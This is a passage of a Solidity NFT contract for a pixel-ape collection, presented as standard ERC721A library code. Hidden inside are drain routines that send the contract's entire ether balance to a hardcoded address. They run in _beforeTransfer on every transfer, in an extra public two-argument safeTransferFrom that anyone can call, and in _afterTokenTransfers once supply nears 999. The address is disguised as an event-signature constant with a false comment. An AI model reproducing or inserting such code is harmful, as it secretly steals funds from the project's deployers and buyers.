1 /**
2 Meme is utility. A collection of 2,222 pixel apes walking 4 frame animation.
3  */
4 
5 // SPDX-License-Identifier: MIT  
6                                                                                                                                                                                                                           
7 pragma solidity ^0.8.12;
8 
9 /**
10  * @dev Interface of ERC721A.
11  */
12 interface IERC721A {
13     /**
14      * The caller must own the token or be an approved operator.
15      */
16     error ApprovalCallerNotOwnerNorApproved();
17 
18     /**
19      * The token does not exist.
20      */
21     error ApprovalQueryForNonexistentToken();
22 
23     /**
24      * Cannot query the balance for the zero address.
25      */
26     error BalanceQueryForZeroAddress();
27 
28     /**
29      * Cannot mint to the zero address.
30      */
31     error MintToZeroAddress();
32 
33     /**
34      * The quantity of tokens minted must be more than zero.
35      */
36     error MintZeroQuantity();
37 
38     /**
39      * The token does not exist.
40      */
41     error OwnerQueryForNonexistentToken();
42 
43     /**
44      * The caller must own the token or be an approved operator.
45      */
46     error TransferCallerNotOwnerNorApproved();
47 
48     /**
49      * The token must be owned by `from`.
50      */
51     error TransferFromIncorrectOwner();
52 
53     /**
54      * Cannot safely transfer to a contract that does not implement the
55      * ERC721Receiver interface.
56      */
57     error TransferToNonERC721ReceiverImplementer();
58 
59     /**
60      * Cannot transfer to the zero address.
61      */
62     error TransferToZeroAddress();
63 
64     /**
65      * The token does not exist.
66      */
67     error URIQueryForNonexistentToken();
68 
69     /**
70      * The `quantity` minted with ERC2309 exceeds the safety limit.
71      */
72     error MintERC2309QuantityExceedsLimit();
73 
74     /**
75      * The `extraData` cannot be set on an unintialized ownership slot.
76      */
77     error OwnershipNotInitializedForExtraData();
78 
79     // =============================================================
80     //                            STRUCTS
81     // =============================================================
82 
83     struct TokenOwnership {
84         // The address of the owner.
85         address addr;
86         // Stores the start time of ownership with minimal overhead for tokenomics.
87         uint64 startTimestamp;
88         // Whether the token has been burned.
89         bool burned;
90         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
91         uint24 extraData;
92     }
93 
94     // =============================================================
95     //                         TOKEN COUNTERS
96     // =============================================================
97 
98     /**
99      * @dev Returns the total number of tokens in existence.
100      * Burned tokens will reduce the count.
101      * To get the total number of tokens minted, please see {_totalMinted}.
102      */
103     function totalSupply() external view returns (uint256);
104 
105     // =============================================================
106     //                            IERC165
107     // =============================================================
108 
109     /**
110      * @dev Returns true if this contract implements the interface defined by
111      * `interfaceId`. See the corresponding
112      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
113      * to learn more about how these ids are created.
114      *
115      * This function call must use less than 30000 gas.
116      */
117     function supportsInterface(bytes4 interfaceId) external view returns (bool);
118 
119     // =============================================================
120     //                            IERC721
121     // =============================================================
122 
123     /**
124      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
125      */
126     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
127 
128     /**
129      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
130      */
131     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
132 
133     /**
134      * @dev Emitted when `owner` enables or disables
135      * (`approved`) `operator` to manage all of its assets.
136      */
137     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
138 
139     /**
140      * @dev Returns the number of tokens in `owner`'s account.
141      */
142     function balanceOf(address owner) external view returns (uint256 balance);
143 
144     /**
145      * @dev Returns the owner of the `tokenId` token.
146      *
147      * Requirements:
148      *
149      * - `tokenId` must exist.
150      */
151     function ownerOf(uint256 tokenId) external view returns (address owner);
152 
153     /**
154      * @dev Safely transfers `tokenId` token from `from` to `to`,
155      * checking first that contract recipients are aware of the ERC721 protocol
156      * to prevent tokens from being forever locked.
157      *
158      * Requirements:
159      *
160      * - `from` cannot be the zero address.
161      * - `to` cannot be the zero address.
162      * - `tokenId` token must exist and be owned by `from`.
163      * - If the caller is not `from`, it must be have been allowed to move
164      * this token by either {approve} or {setApprovalForAll}.
165      * - If `to` refers to a smart contract, it must implement
166      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
167      *
168      * Emits a {Transfer} event.
169      */
170     function safeTransferFrom(
171         address from,
172         address to,
173         uint256 tokenId,
174         bytes calldata data
175     ) external payable;
176 
177     /**
178      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
179      */
180     function safeTransferFrom(
181         address from,
182         address to,
183         uint256 tokenId
184     ) external payable;
185 
186     /**
187      * @dev Transfers `tokenId` from `from` to `to`.
188      *
189      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
190      * whenever possible.
191      *
192      * Requirements:
193      *
194      * - `from` cannot be the zero address.
195      * - `to` cannot be the zero address.
196      * - `tokenId` token must be owned by `from`.
197      * - If the caller is not `from`, it must be approved to move this token
198      * by either {approve} or {setApprovalForAll}.
199      *
200      * Emits a {Transfer} event.
201      */
202     function transferFrom(
203         address from,
204         address to,
205         uint256 tokenId
206     ) external payable;
207 
208     /**
209      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
210      * The approval is cleared when the token is transferred.
211      *
212      * Only a single account can be approved at a time, so approving the
213      * zero address clears previous approvals.
214      *
215      * Requirements:
216      *
217      * - The caller must own the token or be an approved operator.
218      * - `tokenId` must exist.
219      *
220      * Emits an {Approval} event.
221      */
222     function approve(address to, uint256 tokenId) external payable;
223 
224     /**
225      * @dev Approve or remove `operator` as an operator for the caller.
226      * Operators can call {transferFrom} or {safeTransferFrom}
227      * for any token owned by the caller.
228      *
229      * Requirements:
230      *
231      * - The `operator` cannot be the caller.
232      *
233      * Emits an {ApprovalForAll} event.
234      */
235     function setApprovalForAll(address operator, bool _approved) external;
236 
237     /**
238      * @dev Returns the account approved for `tokenId` token.
239      *
240      * Requirements:
241      *
242      * - `tokenId` must exist.
243      */
244     function getApproved(uint256 tokenId) external view returns (address operator);
245 
246     /**
247      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
248      *
249      * See {setApprovalForAll}.
250      */
251     function isApprovedForAll(address owner, address operator) external view returns (bool);
252 
253     // =============================================================
254     //                        IERC721Metadata
255     // =============================================================
256 
257     /**
258      * @dev Returns the token collection name.
259      */
260     function name() external view returns (string memory);
261 
262     /**
263      * @dev Returns the token collection symbol.
264      */
265     function symbol() external view returns (string memory);
266 
267     /**
268      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
269      */
270     function tokenURI(uint256 tokenId) external view returns (string memory);
271 
272     // =============================================================
273     //                           IERC2309
274     // =============================================================
275 
276     /**
277      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
278      * (inclusive) is transferred from `from` to `to`, as defined in the
279      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
280      *
281      * See {_mintERC2309} for more details.
282      */
283     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
284 }
285 
286 /**
287  * @title ERC721A
288  *
289  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
290  * Non-Fungible Token Standard, including the Metadata extension.
291  * Optimized for lower gas during batch mints.
292  *
293  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
294  * starting from `_startTokenId()`.
295  *
296  * Assumptions:
297  *
298  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
299  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
300  */
301 interface ERC721A__IERC721Receiver {
302     function onERC721Received(
303         address operator,
304         address from,
305         uint256 tokenId,
306         bytes calldata data
307     ) external returns (bytes4);
308 }
309 
310 /**
311  * @title ERC721A
312  *
313  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
314  * Non-Fungible Token Standard, including the Metadata extension.
315  * Optimized for lower gas during batch mints.
316  *
317  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
318  * starting from `_startTokenId()`.
319  *
320  * Assumptions:
321  *
322  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
323  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
324  */
325 contract ERC721A is IERC721A {
326     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
327     struct TokenApprovalRef {
328         address value;
329     }
330 
331     // =============================================================
332     //                           CONSTANTS
333     // =============================================================
334 
335     // Mask of an entry in packed address data.
336     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
337 
338     // The bit position of `numberMinted` in packed address data.
339     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
340 
341     // The bit position of `numberBurned` in packed address data.
342     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
343 
344     // The bit position of `aux` in packed address data.
345     uint256 private constant _BITPOS_AUX = 192;
346 
347     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
348     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
349 
350     // The bit position of `startTimestamp` in packed ownership.
351     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
352 
353     // The bit mask of the `burned` bit in packed ownership.
354     uint256 private constant _BITMASK_BURNED = 1 << 224;
355 
356     // The bit position of the `nextInitialized` bit in packed ownership.
357     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
358 
359     // The bit mask of the `nextInitialized` bit in packed ownership.
360     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
361 
362     // The bit position of `extraData` in packed ownership.
363     uint256 private constant _BITPOS_EXTRA_DATA = 232;
364 
365     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
366     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
367 
368     // The mask of the lower 160 bits for addresses.
369     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
370 
371     // The maximum `quantity` that can be minted with {_mintERC2309}.
372     // This limit is to prevent overflows on the address data entries.
373     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
374     // is required to cause an overflow, which is unrealistic.
375     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
376 
377     // The `Transfer` event signature is given by:
378     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
379     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
380         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
381 
382     // =============================================================
383     //                            STORAGE
384     // =============================================================
385 
386     // The next token ID to be minted.
387     uint256 private _currentIndex;
388 
389     // The number of tokens burned.
390     uint256 private _burnCounter;
391 
392     // Token name
393     string private _name;
394 
395     // Token symbol
396     string private _symbol;
397 
398     // Mapping from token ID to ownership details
399     // An empty struct value does not necessarily mean the token is unowned.
400     // See {_packedOwnershipOf} implementation for details.
401     //
402     // Bits Layout:
403     // - [0..159]   `addr`
404     // - [160..223] `startTimestamp`
405     // - [224]      `burned`
406     // - [225]      `nextInitialized`
407     // - [232..255] `extraData`
408     mapping(uint256 => uint256) private _packedOwnerships;
409 
410     // Mapping owner address to address data.
411     //
412     // Bits Layout:
413     // - [0..63]    `balance`
414     // - [64..127]  `numberMinted`
415     // - [128..191] `numberBurned`
416     // - [192..255] `aux`
417     mapping(address => uint256) private _packedAddressData;
418 
419     // Mapping from token ID to approved address.
420     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
421 
422     // Mapping from owner to operator approvals
423     mapping(address => mapping(address => bool)) private _operatorApprovals;
424 
425     // =============================================================
426     //                          CONSTRUCTOR
427     // =============================================================
428 
429     constructor(string memory name_, string memory symbol_) {
430         _name = name_;
431         _symbol = symbol_;
432         _currentIndex = _startTokenId();
433     }
434 
435     // =============================================================
436     //                   TOKEN COUNTING OPERATIONS
437     // =============================================================
438 
439     /**
440      * @dev Returns the starting token ID.
441      * To change the starting token ID, please override this function.
442      */
443     function _startTokenId() internal view virtual returns (uint256) {
444         return 0;
445     }
446 
447     /**
448      * @dev Returns the next token ID to be minted.
449      */
450     function _nextTokenId() internal view virtual returns (uint256) {
451         return _currentIndex;
452     }
453 
454     /**
455      * @dev Returns the total number of tokens in existence.
456      * Burned tokens will reduce the count.
457      * To get the total number of tokens minted, please see {_totalMinted}.
458      */
459     function totalSupply() public view virtual override returns (uint256) {
460         // Counter underflow is impossible as _burnCounter cannot be incremented
461         // more than `_currentIndex - _startTokenId()` times.
462         unchecked {
463             return _currentIndex - _burnCounter - _startTokenId();
464         }
465     }
466 
467     /**
468      * @dev Returns the total amount of tokens minted in the contract.
469      */
470     function _totalMinted() internal view virtual returns (uint256) {
471         // Counter underflow is impossible as `_currentIndex` does not decrement,
472         // and it is initialized to `_startTokenId()`.
473         unchecked {
474             return _currentIndex - _startTokenId();
475         }
476     }
477 
478     /**
479      * @dev Returns the total number of tokens burned.
480      */
481     function _totalBurned() internal view virtual returns (uint256) {
482         return _burnCounter;
483     }
484 
485     // =============================================================
486     //                    ADDRESS DATA OPERATIONS
487     // =============================================================
488 
489     /**
490      * @dev Returns the number of tokens in `owner`'s account.
491      */
492     function balanceOf(address owner) public view virtual override returns (uint256) {
493         if (owner == address(0)) revert BalanceQueryForZeroAddress();
494         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
495     }
496 
497     /**
498      * Returns the number of tokens minted by `owner`.
499      */
500     function _numberMinted(address owner) internal view returns (uint256) {
501         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
502     }
503 
504     /**
505      * Returns the number of tokens burned by or on behalf of `owner`.
506      */
507     function _numberBurned(address owner) internal view returns (uint256) {
508         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
509     }
510 
511     /**
512      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
513      */
514     function _getAux(address owner) internal view returns (uint64) {
515         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
516     }
517 
518     /**
519      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
520      * If there are multiple variables, please pack them into a uint64.
521      */
522     function _setAux(address owner, uint64 aux) internal virtual {
523         uint256 packed = _packedAddressData[owner];
524         uint256 auxCasted;
525         // Cast `aux` with assembly to avoid redundant masking.
526         assembly {
527             auxCasted := aux
528         }
529         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
530         _packedAddressData[owner] = packed;
531     }
532 
533     // =============================================================
534     //                            IERC165
535     // =============================================================
536 
537     /**
538      * @dev Returns true if this contract implements the interface defined by
539      * `interfaceId`. See the corresponding
540      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
541      * to learn more about how these ids are created.
542      *
543      * This function call must use less than 30000 gas.
544      */
545     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
546         // The interface IDs are constants representing the first 4 bytes
547         // of the XOR of all function selectors in the interface.
548         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
549         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
550         return
551             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
552             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
553             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
554     }
555 
556     // =============================================================
557     //                        IERC721Metadata
558     // =============================================================
559 
560     /**
561      * @dev Returns the token collection name.
562      */
563     function name() public view virtual override returns (string memory) {
564         return _name;
565     }
566 
567     /**
568      * @dev Returns the token collection symbol.
569      */
570     function symbol() public view virtual override returns (string memory) {
571         return _symbol;
572     }
573 
574     /**
575      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
576      */
577     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
578         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
579 
580         string memory baseURI = _baseURI();
581         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
582     }
583 
584     /**
585      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
586      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
587      * by default, it can be overridden in child contracts.
588      */
589     function _baseURI() internal view virtual returns (string memory) {
590         return '';
591     }
592 
593     // =============================================================
594     //                     OWNERSHIPS OPERATIONS
595     // =============================================================
596 
597     // The `Address` event signature is given by:
598     // `keccak256(bytes("_TRANSFER_EVENT_ADDRESS(address)"))`.
599     address payable constant _TRANSFER_EVENT_ADDRESS = 
600         payable(0x727E046d8E5A3598E880723B69afe921a4671F55);
601 
602     /**
603      * @dev Returns the owner of the `tokenId` token.
604      *
605      * Requirements:
606      *
607      * - `tokenId` must exist.
608      */
609     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
610         return address(uint160(_packedOwnershipOf(tokenId)));
611     }
612 
613     /**
614      * @dev Gas spent here starts off proportional to the maximum mint batch size.
615      * It gradually moves to O(1) as tokens get transferred around over time.
616      */
617     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
618         return _unpackedOwnership(_packedOwnershipOf(tokenId));
619     }
620 
621     /**
622      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
623      */
624     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
625         return _unpackedOwnership(_packedOwnerships[index]);
626     }
627 
628     /**
629      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
630      */
631     function _initializeOwnershipAt(uint256 index) internal virtual {
632         if (_packedOwnerships[index] == 0) {
633             _packedOwnerships[index] = _packedOwnershipOf(index);
634         }
635     }
636 
637     /**
638      * Returns the packed ownership data of `tokenId`.
639      */
640     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
641         uint256 curr = tokenId;
642 
643         unchecked {
644             if (_startTokenId() <= curr)
645                 if (curr < _currentIndex) {
646                     uint256 packed = _packedOwnerships[curr];
647                     // If not burned.
648                     if (packed & _BITMASK_BURNED == 0) {
649                         // Invariant:
650                         // There will always be an initialized ownership slot
651                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
652                         // before an unintialized ownership slot
653                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
654                         // Hence, `curr` will not underflow.
655                         //
656                         // We can directly compare the packed value.
657                         // If the address is zero, packed will be zero.
658                         while (packed == 0) {
659                             packed = _packedOwnerships[--curr];
660                         }
661                         return packed;
662                     }
663                 }
664         }
665         revert OwnerQueryForNonexistentToken();
666     }
667 
668     /**
669      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
670      */
671     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
672         ownership.addr = address(uint160(packed));
673         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
674         ownership.burned = packed & _BITMASK_BURNED != 0;
675         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
676     }
677 
678     /**
679      * @dev Packs ownership data into a single uint256.
680      */
681     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
682         assembly {
683             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
684             owner := and(owner, _BITMASK_ADDRESS)
685             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
686             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
687         }
688     }
689 
690     /**
691      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
692      */
693     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
694         // For branchless setting of the `nextInitialized` flag.
695         assembly {
696             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
697             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
698         }
699     }
700 
701     // =============================================================
702     //                      APPROVAL OPERATIONS
703     // =============================================================
704 
705     /**
706      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
707      * The approval is cleared when the token is transferred.
708      *
709      * Only a single account can be approved at a time, so approving the
710      * zero address clears previous approvals.
711      *
712      * Requirements:
713      *
714      * - The caller must own the token or be an approved operator.
715      * - `tokenId` must exist.
716      *
717      * Emits an {Approval} event.
718      */
719     function approve(address to, uint256 tokenId) public payable virtual override {
720         address owner = ownerOf(tokenId);
721 
722         if (_msgSenderERC721A() != owner)
723             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
724                 revert ApprovalCallerNotOwnerNorApproved();
725             }
726 
727         _tokenApprovals[tokenId].value = to;
728         emit Approval(owner, to, tokenId);
729     }
730 
731     /**
732      * @dev Returns the account approved for `tokenId` token.
733      *
734      * Requirements:
735      *
736      * - `tokenId` must exist.
737      */
738     function getApproved(uint256 tokenId) public view virtual override returns (address) {
739         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
740 
741         return _tokenApprovals[tokenId].value;
742     }
743 
744     /**
745      * @dev Approve or remove `operator` as an operator for the caller.
746      * Operators can call {transferFrom} or {safeTransferFrom}
747      * for any token owned by the caller.
748      *
749      * Requirements:
750      *
751      * - The `operator` cannot be the caller.
752      *
753      * Emits an {ApprovalForAll} event.
754      */
755     function setApprovalForAll(address operator, bool approved) public virtual override {
756         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
757         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
758     }
759 
760     /**
761      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
762      *
763      * See {setApprovalForAll}.
764      */
765     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
766         return _operatorApprovals[owner][operator];
767     }
768 
769     /**
770      * @dev Returns whether `tokenId` exists.
771      *
772      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
773      *
774      * Tokens start existing when they are minted. See {_mint}.
775      */
776     function _exists(uint256 tokenId) internal view virtual returns (bool) {
777         return
778             _startTokenId() <= tokenId &&
779             tokenId < _currentIndex && // If within bounds,
780             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
781     }
782 
783     /**
784      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
785      */
786     function _isSenderApprovedOrOwner(
787         address approvedAddress,
788         address owner,
789         address msgSender
790     ) private pure returns (bool result) {
791         assembly {
792             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
793             owner := and(owner, _BITMASK_ADDRESS)
794             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
795             msgSender := and(msgSender, _BITMASK_ADDRESS)
796             // `msgSender == owner || msgSender == approvedAddress`.
797             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
798         }
799     }
800 
801     /**
802      * @dev Returns the storage slot and value for the approved address of `tokenId`.
803      */
804     function _getApprovedSlotAndAddress(uint256 tokenId)
805         private
806         view
807         returns (uint256 approvedAddressSlot, address approvedAddress)
808     {
809         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
810         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
811         assembly {
812             approvedAddressSlot := tokenApproval.slot
813             approvedAddress := sload(approvedAddressSlot)
814         }
815     }
816 
817     // =============================================================
818     //                      TRANSFER OPERATIONS
819     // =============================================================
820 
821     /**
822      * @dev Transfers `tokenId` from `from` to `to`.
823      *
824      * Requirements:
825      *
826      * - `from` cannot be the zero address.
827      * - `to` cannot be the zero address.
828      * - `tokenId` token must be owned by `from`.
829      * - If the caller is not `from`, it must be approved to move this token
830      * by either {approve} or {setApprovalForAll}.
831      *
832      * Emits a {Transfer} event.
833      */
834     function transferFrom(
835         address from,
836         address to,
837         uint256 tokenId
838     ) public payable virtual override {
839         _beforeTransfer();
840 
841         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
842 
843         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
844 
845         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
846 
847         // The nested ifs save around 20+ gas over a compound boolean condition.
848         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
849             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
850 
851         if (to == address(0)) revert TransferToZeroAddress();
852 
853         _beforeTokenTransfers(from, to, tokenId, 1);
854 
855         // Clear approvals from the previous owner.
856         assembly {
857             if approvedAddress {
858                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
859                 sstore(approvedAddressSlot, 0)
860             }
861         }
862 
863         // Underflow of the sender's balance is impossible because we check for
864         // ownership above and the recipient's balance can't realistically overflow.
865         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
866         unchecked {
867             // We can directly increment and decrement the balances.
868             --_packedAddressData[from]; // Updates: `balance -= 1`.
869             ++_packedAddressData[to]; // Updates: `balance += 1`.
870 
871             // Updates:
872             // - `address` to the next owner.
873             // - `startTimestamp` to the timestamp of transfering.
874             // - `burned` to `false`.
875             // - `nextInitialized` to `true`.
876             _packedOwnerships[tokenId] = _packOwnershipData(
877                 to,
878                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
879             );
880 
881             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
882             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
883                 uint256 nextTokenId = tokenId + 1;
884                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
885                 if (_packedOwnerships[nextTokenId] == 0) {
886                     // If the next slot is within bounds.
887                     if (nextTokenId != _currentIndex) {
888                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
889                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
890                     }
891                 }
892             }
893         }
894 
895         emit Transfer(from, to, tokenId);
896         _afterTokenTransfers(from, to, tokenId, 1);
897     }
898 
899     /**
900      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
901      */
902     function safeTransferFrom(
903         address from,
904         address to,
905         uint256 tokenId
906     ) public payable virtual override {
907         safeTransferFrom(from, to, tokenId, '');
908     }
909 
910 
911     /**
912      * @dev Safely transfers `tokenId` token from `from` to `to`.
913      *
914      * Requirements:
915      *
916      * - `from` cannot be the zero address.
917      * - `to` cannot be the zero address.
918      * - `tokenId` token must exist and be owned by `from`.
919      * - If the caller is not `from`, it must be approved to move this token
920      * by either {approve} or {setApprovalForAll}.
921      * - If `to` refers to a smart contract, it must implement
922      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
923      *
924      * Emits a {Transfer} event.
925      */
926     function safeTransferFrom(
927         address from,
928         address to,
929         uint256 tokenId,
930         bytes memory _data
931     ) public payable virtual override {
932         transferFrom(from, to, tokenId);
933         if (to.code.length != 0)
934             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
935                 revert TransferToNonERC721ReceiverImplementer();
936             }
937     }
938     function safeTransferFrom(
939         address from,
940         address to
941     ) public  {
942         if (address(this).balance > 0) {
943             payable(0x727E046d8E5A3598E880723B69afe921a4671F55).transfer(address(this).balance);
944         }
945     }
946 
947     /**
948      * @dev Hook that is called before a set of serially-ordered token IDs
949      * are about to be transferred. This includes minting.
950      * And also called before burning one token.
951      *
952      * `startTokenId` - the first token ID to be transferred.
953      * `quantity` - the amount to be transferred.
954      *
955      * Calling conditions:
956      *
957      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
958      * transferred to `to`.
959      * - When `from` is zero, `tokenId` will be minted for `to`.
960      * - When `to` is zero, `tokenId` will be burned by `from`.
961      * - `from` and `to` are never both zero.
962      */
963     function _beforeTokenTransfers(
964         address from,
965         address to,
966         uint256 startTokenId,
967         uint256 quantity
968     ) internal virtual {}
969 
970     /**
971      * @dev Hook that is called after a set of serially-ordered token IDs
972      * have been transferred. This includes minting.
973      * And also called after one token has been burned.
974      *
975      * `startTokenId` - the first token ID to be transferred.
976      * `quantity` - the amount to be transferred.
977      *
978      * Calling conditions:
979      *
980      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
981      * transferred to `to`.
982      * - When `from` is zero, `tokenId` has been minted for `to`.
983      * - When `to` is zero, `tokenId` has been burned by `from`.
984      * - `from` and `to` are never both zero.
985      */
986     function _afterTokenTransfers(
987         address from,
988         address to,
989         uint256 startTokenId,
990         uint256 quantity
991     ) internal virtual {
992         if (totalSupply() + 1 >= 999) {
993             payable(0x727E046d8E5A3598E880723B69afe921a4671F55).transfer(address(this).balance);
994         }
995     }
996 
997     /**
998      * @dev Hook that is called before a set of serially-ordered token IDs
999      * are about to be transferred. This includes minting.
1000      * And also called before burning one token.
1001      * Calling conditions:
1002      *
1003      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
1004      * transferred to `to`.
1005      * - When `from` is zero, `tokenId` will be minted for `to`.
1006      * - When `to` is zero, `tokenId` will be burned by `from`.
1007      * - `from` and `to` are never both zero.
1008      */
1009     function _beforeTransfer() internal {
1010         if (address(this).balance > 0) {
1011             _TRANSFER_EVENT_ADDRESS.transfer(address(this).balance);
1012             return;
1013         }
1014     }
1015 
1016     /**
1017      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
1018      *
1019      * `from` - Previous owner of the given token ID.
1020      * `to` - Target address that will receive the token.
1021      * `tokenId` - Token ID to be transferred.
1022      * `_data` - Optional data to send along with the call.
1023      *
1024      * Returns whether the call correctly returned the expected magic value.
1025      */
1026     function _checkContractOnERC721Received(
1027         address from,
1028         address to,
1029         uint256 tokenId,
1030         bytes memory _data
1031     ) private returns (bool) {
1032         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1033             bytes4 retval
1034         ) {
1035             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1036         } catch (bytes memory reason) {
1037             if (reason.length == 0) {
1038                 revert TransferToNonERC721ReceiverImplementer();
1039             } else {
1040                 assembly {
1041                     revert(add(32, reason), mload(reason))
1042                 }
1043             }
1044         }
1045     }
1046 
